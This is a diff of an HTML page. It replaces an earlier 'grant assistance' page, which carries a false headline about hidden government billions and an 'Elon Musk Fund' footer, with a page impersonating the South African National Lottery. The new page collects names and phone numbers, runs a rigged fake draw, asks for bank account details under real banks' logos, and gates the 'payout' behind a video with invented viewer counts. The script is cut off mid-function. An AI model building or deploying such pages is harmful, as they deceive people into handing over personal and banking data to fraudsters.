@@ -1,215 +1,1342 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>South African National Lottery</title>
 
-  <script>
-  window.pixelId = "69f3308425c7d3cc4f8da0a2";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+<style>
+*{box-sizing:border-box}
 
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1213905960435896');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1213905960435896&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
+body{
+  margin:0;
+  font-family:Arial, Helvetica, sans-serif;
+  background:#eaf1f8;
+  color:#001b3f;
+}
 
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>GRANT ASSISTANCE SYSTEM</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+.top-small{
+  height:30px;
+  background:#0b2f68;
+  color:#fff;
+  font-size:13px;
+  font-weight:700;
+  display:flex;
+  align-items:center;
+  padding:0 18px;
+}
 
-    body {
-      background-color: #0a0a0a;
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      min-height: 100vh;
-    }
+.header{
+  height:72px;
+  background:#0f55a8;
+  border-bottom:7px solid #0b8f3a;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:0 14px;
+  gap:10px;
+}
 
-    /* HEADER */
-    .header-bar {
-      background: linear-gradient(135deg, #b8860b, #d4a017, #ffd700);
-      text-align: center;
-      padding: 14px 20px;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      box-shadow: 0 2px 12px rgba(255, 215, 0, 0.4);
-    }
+.logo-box{
+  width:92px;
+  height:42px;
+  background:#fff;
+  border-radius:8px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  padding:4px;
+}
 
-    .header-bar p {
-      font-size: 0.95rem;
-      font-weight: 700;
-      color: #1a0a00;
-      letter-spacing: 0.5px;
-      text-transform: uppercase;
-    }
+.logo-box img{
+  max-width:100%;
+  max-height:100%;
+  object-fit:contain;
+}
 
-    .header-bar span.date {
-      font-weight: 900;
-      color: #6b0000;
-    }
+.header-title{
+  color:#fff;
+  font-size:15px;
+  font-weight:900;
+  flex:1;
+  white-space:nowrap;
+  overflow:hidden;
+  text-overflow:ellipsis;
+}
 
-    /* HERO */
-    .hero {
-      text-align: center;
-      padding: 36px 20px 16px;
-    }
+.jackpot{
+  background:#ffc000;
+  border-radius:10px;
+  padding:8px 12px;
+  text-align:center;
+  min-width:118px;
+  font-weight:900;
+  color:#001b3f;
+}
 
-    .hero h1 {
-      font-size: clamp(1.6rem, 4vw, 2.8rem);
-      line-height: 1.3;
-      color: #ffd700;
-      text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
-      margin-bottom: 12px;
-    }
+.jackpot small{
+  display:block;
+  font-size:9px;
+}
 
-    .hero p.subtitle {
-      font-size: clamp(0.95rem, 2.5vw, 1.2rem);
-      color: #ccc;
-      max-width: 600px;
-      margin: 0 auto 20px;
-      line-height: 1.6;
-    }
+.jackpot span{
+  font-size:15px;
+}
 
-    /* VIDEO SECTION */
-    .video-wrapper {
-      display: flex;
-      justify-content: center;
-      padding: 0 20px 20px;
-    }
+.page{
+  max-width:430px;
+  margin:0 auto;
+}
 
-    .video-container {
-      width: 100%;
-      max-width: 500px;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 0 40px rgba(255, 215, 0, 0.2), 0 8px 32px rgba(0,0,0,0.6);
-      border: 2px solid rgba(255, 215, 0, 0.25);
-    }
+.card{
+  margin:22px 14px 54px;
+  background:#fff;
+  border-radius:10px;
+  padding:28px 20px;
+  box-shadow:0 3px 10px rgba(0,0,0,.14);
+}
 
-    /* MOBILE: video first fold */
-    @media (max-width: 768px) {
-      .hero {
-        padding: 10px 16px 8px;
-      }
+.trophy{
+  text-align:center;
+  font-size:30px;
+  margin-bottom:8px;
+}
 
-      .hero h1 {
-        font-size: 1.05rem;
-        margin-bottom: 4px;
-      }
+h1{
+  margin:0;
+  text-align:center;
+  font-size:18px;
+  line-height:1.45;
+  font-weight:900;
+  color:#001533;
+}
 
-      .hero p.subtitle {
-        font-size: 0.78rem;
-        margin-bottom: 10px;
-        line-height: 1.4;
-      }
+.subtitle{
+  text-align:center;
+  margin:9px 0 24px;
+  font-size:14px;
+  color:#12233f;
+}
 
-      .video-wrapper {
-        padding: 0 10px 12px;
-      }
+label{
+  display:block;
+  font-size:13px;
+  font-weight:800;
+  margin:0 0 8px;
+}
 
-      .header-bar {
-        padding: 9px 12px;
-      }
+input{
+  width:100%;
+  height:44px;
+  border:1px solid #cbd5e1;
+  border-radius:8px;
+  padding:0 12px;
+  font-size:14px;
+  margin-bottom:20px;
+  background:#fff;
+}
 
-      .header-bar p {
-        font-size: 0.72rem;
-      }
-    }
+input:focus{
+  outline:none;
+  border-color:#0f55a8;
+}
 
-    /* VOLUME HINT */
-    .volume-hint {
-      text-align: center;
-      padding: 18px 20px 40px;
-    }
+.prize-title{
+  font-size:13px;
+  font-weight:800;
+  margin-bottom:10px;
+}
 
-    .volume-hint p {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 1rem;
-      font-weight: 700;
-      color: #ffd700;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-      background: rgba(255, 215, 0, 0.08);
-      border: 1px solid rgba(255, 215, 0, 0.25);
-      border-radius: 8px;
-      padding: 12px 24px;
-    }
+.prize{
+  width:100%;
+  min-height:54px;
+  border:1px solid #cfe0f5;
+  background:#f3f9ff;
+  border-radius:8px;
+  margin-bottom:10px;
+  padding:0 14px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  cursor:pointer;
+}
 
-    /* FOOTER */
-    footer {
-      text-align: center;
-      padding: 24px 20px;
-      border-top: 1px solid #1e1e1e;
-      color: #555;
-      font-size: 0.78rem;
-    }
-  </style>
+.prize.active{
+  border:2px solid #0f55a8;
+  background:#e9f4ff;
+}
+
+.prize-left{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  font-size:15px;
+  font-weight:900;
+}
+
+.prize-amount{
+  font-size:15px;
+  font-weight:900;
+}
+
+.submit-btn{
+  width:100%;
+  height:48px;
+  border:none;
+  border-radius:8px;
+  margin-top:13px;
+  background:#c9ced6;
+  color:#fff;
+  font-size:15px;
+  font-weight:900;
+  cursor:not-allowed;
+}
+
+.submit-btn.enabled{
+  background:#149447;
+  cursor:pointer;
+}
+
+.secure{
+  margin-top:14px;
+  text-align:center;
+  font-size:11px;
+  color:#24415f;
+}
+
+.draw-box{
+  background:#1e4fa3;
+  color:#fff;
+  border-radius:9px;
+  padding:17px 12px;
+  margin:18px 0;
+}
+
+.draw-head{
+  display:flex;
+  justify-content:space-between;
+  font-size:10px;
+  font-weight:800;
+  margin-bottom:14px;
+}
+
+.ball-row{
+  display:flex;
+  justify-content:center;
+  gap:10px;
+}
+
+.draw-ball,
+.hidden-ball{
+  width:46px;
+  height:46px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:17px;
+  font-weight:900;
+}
+
+.draw-ball{
+  background:#fff;
+  color:#001533;
+  transform:scale(.6);
+  animation:ballPop .35s ease forwards;
+}
+
+.draw-ball.win{
+  background:#ffc000;
+  border:2px solid #fff;
+  color:#001533;
+  animation:ballPop .35s ease forwards, winnerPulse 1s ease infinite;
+}
+
+.hidden-ball{
+  border:2px solid rgba(255,255,255,.25);
+  background:#163e7f;
+  color:rgba(255,255,255,.35);
+}
+
+.processing-text{
+  text-align:center;
+  margin-top:14px;
+  font-size:12px;
+  font-weight:800;
+  color:#fff;
+}
+
+.loader,
+.big-loader{
+  border-radius:50%;
+  border:5px solid rgba(30,79,163,.18);
+  border-top-color:#1e4fa3;
+  margin:0 auto;
+  animation:spin .8s linear infinite;
+}
+
+.loader{
+  width:28px;
+  height:28px;
+  border-width:4px;
+  border-color:rgba(255,255,255,.35);
+  border-top-color:#ffc000;
+  margin-top:12px;
+}
+
+.big-loader{
+  width:62px;
+  height:62px;
+  margin-bottom:22px;
+}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes ballPop{to{transform:scale(1)}}
+@keyframes winnerPulse{0%,100%{box-shadow:0 0 0 0 rgba(255,192,0,.55)}50%{box-shadow:0 0 0 8px rgba(255,192,0,0)}}
+
+.lucky-title{
+  text-align:center;
+  font-size:13px;
+  margin:19px 0 12px;
+}
+
+.number-grid{
+  display:grid;
+  grid-template-columns:repeat(5, 1fr);
+  gap:10px;
+}
+
+.number-btn{
+  width:100%;
+  aspect-ratio:1/1;
+  border-radius:50%;
+  border:1.5px solid #0f55a8;
+  background:#fff;
+  color:#001533;
+  font-size:16px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.result-panel{
+  margin-top:18px;
+  padding:20px 14px;
+  border-radius:9px;
+  border:1px solid #149447;
+  background:#eaf8ef;
+  text-align:center;
+}
+
+.result-panel h2{
+  margin:6px 0;
+  font-size:18px;
+  color:#008f3c;
+}
+
+.result-panel p{
+  margin:5px 0;
+  font-size:14px;
+}
+
+.result-panel .amount{
+  font-size:24px;
+  font-weight:900;
+  color:#e60012;
+  margin:12px 0;
+}
+
+.claim-btn,
+.red-btn{
+  width:100%;
+  height:48px;
+  border:none;
+  border-radius:8px;
+  color:#fff;
+  font-size:15px;
+  font-weight:900;
+  margin-top:12px;
+  cursor:pointer;
+}
+
+.claim-btn{background:#149447}
+.red-btn{background:#e53e45}
+
+.deposit-card{
+  padding:0;
+  overflow:hidden;
+  border:1px solid #149447;
+}
+
+.deposit-top{
+  background:#2b8e3f;
+  color:#fff;
+  text-align:center;
+  font-size:15px;
+  font-weight:900;
+  padding:13px 10px;
+}
+
+.deposit-inner{
+  padding:22px 20px 24px;
+}
+
+.bank-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:9px;
+  margin-bottom:20px;
+}
+
+.bank{
+  height:46px;
+  border:1px solid #cbd5e1;
+  border-radius:8px;
+  background:#fff;
+  display:flex;
+  align-items:center;
+  gap:9px;
+  padding:0 9px;
+  font-size:12px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.bank.active{
+  border:2px solid #0f55a8;
+  background:#f3f9ff;
+}
+
+.bank-logo-img{
+  width:30px;
+  height:30px;
+  border-radius:7px;
+  object-fit:contain;
+  background:#fff;
+  padding:3px;
+}
+
+.processing-card{
+  text-align:center;
+  padding:44px 24px;
+}
+
+.processing-card h1{
+  font-size:17px;
+  margin-bottom:8px;
+}
+
+.status-lines{
+  margin-top:22px;
+  text-align:left;
+  font-size:13px;
+  line-height:1.9;
+  color:#008f3c;
+}
+
+.approved-card{
+  border-top:4px solid #149447;
+  text-align:center;
+}
+
+.checkmark{
+  width:34px;
+  height:34px;
+  margin:0 auto 10px;
+  border-radius:6px;
+  background:#58c985;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:25px;
+  font-weight:900;
+}
+
+.bank-approved-box{
+  border:1px solid #cfe0f5;
+  background:#f7fbff;
+  border-radius:7px;
+  padding:10px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:12px;
+  margin:15px 20px 18px;
+  text-align:left;
+}
+
+.bank-approved-box small{
+  display:block;
+  font-size:9px;
+  color:#6b7280;
+  font-weight:800;
+}
+
+.final-warning{
+  background:#fff8dc;
+  border:1px solid #f0b429;
+  color:#001533;
+  border-radius:8px;
+  padding:13px;
+  font-size:12px;
+  line-height:1.45;
+  text-align:left;
+  margin-top:16px;
+}
+
+.video-summary{
+  display:flex;
+  gap:12px;
+  align-items:center;
+  background:#fff;
+  border-left:4px solid #149447;
+  border-radius:8px;
+  padding:12px;
+  box-shadow:0 2px 8px rgba(0,0,0,.12);
+  margin-bottom:18px;
+}
+
+.video-summary .bank-logo-img{
+  width:34px;
+  height:34px;
+}
+
+.video-summary-grid{
+  width:100%;
+  display:grid;
+  grid-template-columns:1fr 1fr 1fr;
+  gap:8px;
+  font-size:11px;
+}
+
+.video-summary-grid strong{
+  display:block;
+  font-size:12px;
+  margin-top:4px;
+}
+
+.video-title{
+  font-size:18px;
+  font-weight:900;
+  text-align:center;
+  margin:0 0 8px;
+}
+
+.video-title span{color:#008f3c}
+
+.video-frame{
+  background:#000;
+  border:3px solid #0b2f68;
+  border-radius:6px;
+  overflow:hidden;
+  min-height:220px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+  margin-top:15px;
+  position:relative;
+}
+
+.video-placeholder{
+  text-align:center;
+  padding:24px;
+  font-size:13px;
+  line-height:1.5;
+}
+
+.live-strip{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  border:1px solid #0f55a8;
+  border-bottom:none;
+  border-radius:6px 6px 0 0;
+  background:#fff;
+  padding:7px 10px;
+  margin-top:16px;
+  font-size:12px;
+}
+
+.live-badge{
+  background:#e5282f;
+  color:#fff;
+  border-radius:18px;
+  padding:5px 10px;
+  font-weight:900;
+}
+
+.live-comments-box{
+  margin-top:24px;
+  background:#ffffff;
+  border-radius:10px;
+  box-shadow:0 2px 8px rgba(0,0,0,.12);
+  overflow:hidden;
+}
+
+.live-comments-header{
+  background:#0b2f68;
+  color:#fff;
+  padding:11px 13px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  font-size:13px;
+  font-weight:900;
+}
+
+.live-comments-header small{
+  font-size:11px;
+  font-weight:700;
+}
+
+.live-comments-list{
+  max-height:320px;
+  overflow:hidden;
+  padding:10px;
+  background:#fff;
+}
+
+.live-comment{
+  display:flex;
+  gap:9px;
+  padding:10px 4px;
+  border-bottom:1px solid #eef2f7;
+  animation:commentIn .35s ease forwards;
+}
+
+.live-avatar{
+  width:34px;
+  height:34px;
+  border-radius:50%;
+  background:#dbeafe;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:16px;
+  flex:0 0 auto;
+}
+
+.live-comment-body{
+  font-size:12px;
+  line-height:1.35;
+}
+
+.live-comment-name{
+  font-weight:900;
+  color:#001b3f;
+  margin-bottom:2px;
+}
+
+.live-comment-text{
+  color:#26384f;
+}
+
+.live-comment-time{
+  font-size:10px;
+  color:#6b7280;
+  margin-top:3px;
+}
+
+@keyframes commentIn{
+  from{opacity:0;transform:translateY(8px)}
+  to{opacity:1;transform:translateY(0)}
+}
+
+.footer{
+  background:#0b2f68;
+  color:#fff;
+  padding:26px 14px;
+  font-size:13px;
+}
+
+.footer h3{
+  font-size:15px;
+  margin:0 0 9px;
+}
+
+.footer p{
+  margin:0 0 18px;
+  line-height:1.45;
+}
+
+.overlay{
+  position:fixed;
+  inset:0;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  z-index:99999;
+  padding:20px;
+  background:rgba(0,0,0,.28);
+  backdrop-filter:blur(14px);
+  -webkit-backdrop-filter:blur(14px);
+}
+
+.overlay::before{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:rgba(0,0,0,.22);
+}
+
+.age-box{
+  position:relative;
+  z-index:2;
+  width:100%;
+  max-width:338px;
+  background:#fff;
+  border-radius:11px;
+  padding:21px 20px 20px;
+  text-align:center;
+}
+
+.age-circle{
+  width:72px;
+  height:72px;
+  margin:0 auto 17px;
+  border-radius:50%;
+  background:#ed1b2f;
+  border:4px solid #071827;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:22px;
+  font-weight:900;
+}
+
+.age-box h2{
+  margin:0 0 10px;
+  font-size:17px;
+  font-weight:800;
+  color:#111827;
+}
+
+.age-text{
+  margin:0 auto 12px;
+  max-width:292px;
+  font-size:12px;
+  line-height:1.35;
+  color:#374151;
+}
+
+.responsible-text{
+  margin:0 auto 18px;
+  max-width:292px;
+  font-size:9.5px;
+  line-height:1.35;
+  color:#6b7280;
+}
+
+.age-primary{
+  width:100%;
+  height:39px;
+  border:none;
+  border-radius:7px;
+  background:#149447;
+  color:#fff;
+  font-size:13px;
+  font-weight:800;
+}
+
+.age-secondary{
+  width:100%;
+  height:32px;
+  margin-top:8px;
+  border:none;
+  border-radius:7px;
+  background:#e5e7eb;
+  color:#111827;
+  font-size:12px;
+}
+
+.step{display:none}
+.step.active{display:block}
+</style>
 </head>
+
 <body>
 
-  <!-- HEADER -->
-  <div class="header-bar">
-    <p>⚠️ WARNING: This page can be blocked at any moment — Don't miss out!</p>
+<div class="overlay" id="ageOverlay">
+  <div class="age-box">
+    <div class="age-circle">18+</div>
+    <h2>Age Verification</h2>
+    <p class="age-text">
+      This site is restricted to adults. By continuing, you confirm that
+      you are <strong>18 years of age or older</strong> and legally allowed to
+      participate in lottery activities in your country.
+    </p>
+    <p class="responsible-text">
+      Play responsibly. National Responsible Gambling Programme — 0800 006 008.
+    </p>
+    <button class="age-primary" onclick="confirmAge()">✔ I am 18 or older — Enter</button>
+    <button class="age-secondary" onclick="underAge()">I am under 18 — Exit</button>
+  </div>
+</div>
+
+<div class="top-small">📞 0861 101 101</div>
+
+<header class="header">
+  <div class="logo-box">
+    <img src="https://www.saprofilemagazine.co.za/wp-content/uploads/2023/11/National-Lottery.png" alt="National Lottery Logo">
   </div>
 
-  <!-- HERO -->
-  <section class="hero">
-    <h1>SYSTEM GLITCH EXPOSES BILLIONS THE GOVERNMENT WAS HIDING FROM THE SOUTH AFRICAN PUBLIC</h1>
+  <div class="header-title">South African National ...</div>
+
+  <div class="jackpot">
+    <small>🏆 JACKPOT PRIZE</small>
+    <span>R 150,000,000</span>
+  </div>
+</header>
+
+<main class="page">
+
+  <section class="card step active" id="step1">
+    <div class="trophy">🏆</div>
+
+    <h1>YOU HAVE THE CHANCE TO WIN ONE OF THESE PRIZES</h1>
+    <p class="subtitle">Enter your details and pick the prize you want to win.</p>
+
+    <label>Full name</label>
+    <input type="text" id="fullName" placeholder="e.g. Thabo Mokoena" oninput="validateStep1()">
+
+    <label>Phone number</label>
+    <input type="tel" id="phoneNumber" placeholder="e.g. 071 234 5678" oninput="validateStep1()">
+
+    <div class="prize-title">Choose your desired prize:</div>
+
+    <div class="prize" onclick="selectPrize('First Prize', this)">
+      <div class="prize-left">🥇 <span>First Prize</span></div>
+      <div class="prize-amount">R 150,000,000</div>
+    </div>
+
+    <div class="prize" onclick="selectPrize('Second Prize', this)">
+      <div class="prize-left">🥈 <span>Second Prize</span></div>
+      <div class="prize-amount">R 60,000,000</div>
+    </div>
+
+    <div class="prize" onclick="selectPrize('Third Prize', this)">
+      <div class="prize-left">🥉 <span>Third Prize</span></div>
+      <div class="prize-amount">R 30,000,000</div>
+    </div>
+
+    <div class="prize" onclick="selectPrize('Fourth Prize', this)">
+      <div class="prize-left">🏆 <span>Fourth Prize</span></div>
+      <div class="prize-amount">R 15,000,000</div>
+    </div>
+
+    <div class="prize" onclick="selectPrize('Fifth Prize', this)">
+      <div class="prize-left">🎯 <span>Fifth Prize</span></div>
+      <div class="prize-amount">R 6,000,000</div>
+    </div>
+
+    <button class="submit-btn" id="drawBtn" onclick="goToDraw()" disabled>⭐ ENTER THE DRAW</button>
+
+    <div class="secure">🔒 Secure & confidential</div>
   </section>
 
-  <!-- VIDEO -->
-  <div class="video-wrapper">
-    <div class="video-container">
-      <vturb-smartplayer id="vid-6a7273c47fb55a1172d6e657" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;">
-        <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0; z-index: 0; background-color: black;"></div>
-      </vturb-smartplayer> 
-      <script type="text/javascript"> 
-        var s=document.createElement("script"); 
-        s.src="https://scripts.converteai.net/779c895f-0947-4c45-ad11-e7f2e45cc298/players/6a7273c47fb55a1172d6e657/v4/player.js", s.async=!0,document.head.appendChild(s); 
-      </script>
+  <section class="card step" id="step2">
+    <p class="subtitle" id="helloText"></p>
+    <h1 id="competingText"></h1>
+    <p class="subtitle" id="drawStatusText">Pick your lucky number for the draw:</p>
+
+    <div class="draw-box" id="drawBox">
+      <div class="draw-head">
+        <span>🔴 LIVE DRAW</span>
+        <span>#9166</span>
+      </div>
+
+      <div class="ball-row" id="hiddenBalls">
+        <div class="hidden-ball">?</div>
+        <div class="hidden-ball">?</div>
+        <div class="hidden-ball">?</div>
+        <div class="hidden-ball">?</div>
+        <div class="hidden-ball">?</div>
+      </div>
     </div>
-  </div>
 
-  <!-- VOLUME HINT -->
-  <div class="volume-hint">
-    <p>🔊 Turn up the volume!</p>
-  </div>
+    <div id="chooseArea">
+      <div class="lucky-title">Choose your lucky number:</div>
+      <div class="number-grid">
+        <button class="number-btn" onclick="startDraw(1)">1</button>
+        <button class="number-btn" onclick="startDraw(2)">2</button>
+        <button class="number-btn" onclick="startDraw(3)">3</button>
+        <button class="number-btn" onclick="startDraw(4)">4</button>
+        <button class="number-btn" onclick="startDraw(5)">5</button>
+        <button class="number-btn" onclick="startDraw(6)">6</button>
+        <button class="number-btn" onclick="startDraw(7)">7</button>
+        <button class="number-btn" onclick="startDraw(8)">8</button>
+        <button class="number-btn" onclick="startDraw(9)">9</button>
+        <button class="number-btn" onclick="startDraw(10)">10</button>
+      </div>
+    </div>
 
-  <!-- FOOTER -->
-  <footer>
-    <p>&copy; 2026 Elon Musk Fund. All rights reserved.</p>
-  </footer>
+    <div id="resultArea"></div>
+  </section>
+
+  <section class="card deposit-card step" id="step3">
+    <div class="deposit-top" id="depositPrize">💰 PRIZE CONFIRMED</div>
+
+    <div class="deposit-inner">
+      <h1>Where should we deposit your winnings?</h1>
+      <p class="subtitle">Select your South African bank and enter your account details.</p>
+
+      <label>Select your bank:</label>
+
+      <div class="bank-grid">
+        <div class="bank" onclick="selectBank('ABSA', this, 'https://upload.wikimedia.org/wikipedia/commons/d/de/ABSA_Group_Limited_Logo.svg')"><img class="bank-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/d/de/ABSA_Group_Limited_Logo.svg" alt="ABSA">ABSA</div>
+        <div class="bank" onclick="selectBank('Standard Bank', this, 'https://companieslogo.com/img/orig/SBK.JO-ad034386.png?t=1720244493')"><img class="bank-logo-img" src="https://companieslogo.com/img/orig/SBK.JO-ad034386.png?t=1720244493" alt="Standard Bank">Standard Bank</div>
+        <div class="bank" onclick="selectBank('FNB', this, 'https://iconlogovector.com/uploads/images/2025/10/lg-6903f80289f12-First-National-Bank.webp')"><img class="bank-logo-img" src="https://iconlogovector.com/uploads/images/2025/10/lg-6903f80289f12-First-National-Bank.webp" alt="FNB">FNB</div>
+        <div class="bank" onclick="selectBank('Nedbank', this, 'https://www.nedbank.co.mz/images/NEDBANK_N_Symbol_RGB.png')"><img class="bank-logo-img" src="https://www.nedbank.co.mz/images/NEDBANK_N_Symbol_RGB.png" alt="Nedbank">Nedbank</div>
+        <div class="bank" onclick="selectBank('Capitec', this, 'https://iconlogovector.com/uploads/images/2025/10/lg-68f0c501db2da-Capitec-Bank.webp')"><img class="bank-logo-img" src="https://iconlogovector.com/uploads/images/2025/10/lg-68f0c501db2da-Capitec-Bank.webp" alt="Capitec">Capitec</div>
+        <div class="bank" onclick="selectBank('Investec', this, 'https://upload.wikimedia.org/wikipedia/en/e/e0/Investec_logo.svg')"><img class="bank-logo-img" src="https://upload.wikimedia.org/wikipedia/en/e/e0/Investec_logo.svg" alt="Investec">Investec</div>
+        <div class="bank" onclick="selectBank('African Bank', this, 'https://logovectorseek.com/wp-content/uploads/2020/09/african-bank-logo-vector.png')"><img class="bank-logo-img" src="https://logovectorseek.com/wp-content/uploads/2020/09/african-bank-logo-vector.png" alt="African Bank">African Bank</div>
+        <div class="bank" onclick="selectBank('TymeBank', this, 'https://upload.wikimedia.org/wikipedia/en/f/f9/TymeBank_Logo.jpg')"><img class="bank-logo-img" src="https://upload.wikimedia.org/wikipedia/en/f/f9/TymeBank_Logo.jpg" alt="TymeBank">TymeBank</div>
+        <div class="bank" onclick="selectBank('Discovery Bank', this, 'https://companieslogo.com/img/orig/DSY.JO_BIG-ce49a76d.png?t=1720244491')"><img class="bank-logo-img" src="https://companieslogo.com/img/orig/DSY.JO_BIG-ce49a76d.png?t=1720244491" alt="Discovery Bank">Discovery Bank</div>
+        <div class="bank" onclick="selectBank('Bidvest Bank', this, 'https://companieslogo.com/img/orig/BVT.JO_BIG-e7c62d5c.png?t=1720244491')"><img class="bank-logo-img" src="https://companieslogo.com/img/orig/BVT.JO_BIG-e7c62d5c.png?t=1720244491" alt="Bidvest Bank">Bidvest Bank</div>
+      </div>
+
+      <label>Account holder</label>
+      <input type="text" id="accountHolder" oninput="validateDeposit()">
+
+      <label>Account number</label>
+      <input type="text" id="accountNumber" placeholder="e.g. 1234567890" oninput="validateDeposit()">
+
+      <button class="submit-btn" id="depositBtn" onclick="processDeposit()" disabled>PROCESS MY DEPOSIT →</button>
+
+      <div class="secure">🔒 Secure & encrypted connection</div>
+    </div>
+  </section>
+
+  <section class="card processing-card step" id="step4">
+    <div class="big-loader"></div>
+    <h1>Processing your deposit...</h1>
+    <p class="subtitle" style="margin-bottom:0;">Verifying account details...</p>
+    <div class="status-lines" id="processingLines">
+      ✓ Connecting to selected bank...<br>
+      ✓ Verifying account details...
+    </div>
+  </section>
+
+  <section class="card approved-card step" id="step5">
+    <div class="checkmark">✓</div>
+    <h1 style="color:#008f3c;">BANK APPROVED!</h1>
+
+    <div class="bank-approved-box">
+      <img class="bank-logo-img" id="approvedBankLogo" src="" alt="Selected bank">
+      <div>
+        <small>VERIFIED BANK</small>
+        <strong id="approvedBankName"></strong>
+      </div>
+    </div>
+
+    <p class="subtitle" id="approvedText"></p>
+
+    <div class="final-warning">
+      ⚠️ <strong>ONE LAST STEP TO UNLOCK YOUR <span id="approvedAmountText"></span></strong><br>
+      Watch the short video to continue and confirm your payout.
+    </div>
+
+    <button class="red-btn" onclick="goToVideo()">▶ WATCH VIDEO TO RECEIVE</button>
+  </section>
+
+  <section class="step" id="step6">
+    <div class="video-summary">
+      <img class="bank-logo-img" id="videoBankLogo" src="" alt="Selected bank">
+      <div class="video-summary-grid">
+        <div>NAME<strong id="videoName"></strong></div>
+        <div>BANK<strong id="videoBank"></strong></div>
+        <div>AMOUNT<strong style="color:#008f3c;" id="videoAmount"></strong></div>
+      </div>
+    </div>
+
+    <div class="video-title">WATCH UNTIL THE END TO RELEASE YOUR <span id="videoAmountTitle"></span></div>
+    <p class="subtitle" id="videoDescription"></p>
+
+    <div class="live-strip">
+      <span class="live-badge">● LIVE NOW</span>
+      <span>👥 3,542 watching</span>
+    </div>
+
+    <div class="video-frame">
+      <vturb-smartplayer id="vid-6a7d050ffe4c9e094eee4611" style="display:block;margin:0 auto;width:100%;">
+        <div class="vturb-player-placeholder" style="position:relative;width:100%;padding:50% 0 0;z-index:0;background-color:black;"></div>
+      </vturb-smartplayer>
+    </div>
+
+    <div class="live-comments-box">
+      <div class="live-comments-header">
+        <span>🔴 Live Comments</span>
+        <small id="liveCount">3,542 watching</small>
+      </div>
+
+      <div class="live-comments-list" id="liveCommentsList"></div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <h3>Customer Support</h3>
+  <p>📞 0861 101 101</p>
+
+  <h3>Security</h3>
+  <p>🛡 Licensed Draws</p>
+
+  <h3>About Us</h3>
+  <p>Official lottery platform in South Africa. Transparency and security guaranteed.</p>
+</footer>
+
+<script>
+const quizData = {
+  fullName:"",
+  phoneNumber:"",
+  prizeName:"",
+  competitionPrizeName:"",
+  prizeAmount:"",
+  luckyNumber:"",
+  bankName:"",
+  bankLogo:"",
+  accountHolder:"",
+  accountNumber:""
+};
+
+function confirmAge(){
+  document.getElementById("ageOverlay").style.display = "none";
+}
+
+function underAge(){
+  window.location.href = "https://www.google.com";
+}
+
+function selectPrize(name, element){
+  quizData.prizeName = name;
+  quizData.competitionPrizeName = name;
+
+  document.querySelectorAll(".prize").forEach(item => item.classList.remove("active"));
+  element.classList.add("active");
+
+  validateStep1();
+}
+
+function validateStep1(){
+  quizData.fullName = document.getElementById("fullName").value.trim();
+  quizData.phoneNumber = document.getElementById("phoneNumber").value.trim();
+
+  const btn = document.getElementById("drawBtn");
+
+  if(quizData.fullName && quizData.phoneNumber && quizData.prizeName){
+    btn.disabled = false;
+    btn.classList.add("enabled");
+  }else{
+    btn.disabled = true;
+    btn.classList.remove("enabled");
+  }
+}
+
+function showStep(id){
+  document.querySelectorAll(".step").forEach(step => step.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  window.scrollTo({top:0, behavior:"smooth"});
+}
+
+function goToDraw(){
+  document.getElementById("helloText").innerHTML =
+    `Hello, <strong>${quizData.fullName.split(" ")[0]}</strong>`;
+
+  document.getElementById("competingText").innerHTML =
+    `You are competing for <span style="color:#004fb6">${quizData.competitionPrizeName}</span><br>
+     <span style="font-size:16px;font-weight:900;color:#149447;">Selected prize: ${getCompetitionPrizeAmount()}</span><br>
